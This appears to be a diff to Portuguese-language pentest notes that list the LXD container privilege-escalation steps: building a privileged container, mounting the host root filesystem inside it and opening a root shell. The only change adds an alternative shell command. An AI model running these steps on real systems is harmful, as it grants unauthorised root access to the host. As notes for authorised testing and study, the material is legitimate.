@@ -63,7 +63,7 @@ lxc image list -> listar imagem importada com nome que damos
 lxc init nome-qa-imagem-que-demos privesc -c security.privileged=true  -> criar conteiner chamado privesc com priv root
 lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true  -> montar root do host dentro do container
 lxc start privesc -> iniciar container
-lxc exec privesc /bin/bash -> entrar no container
+lxc exec privesc /bin/bash ou lxc exec privesc -- /bin/sh -> entrar no container
 
 
 # Identifica a distribuição Linux
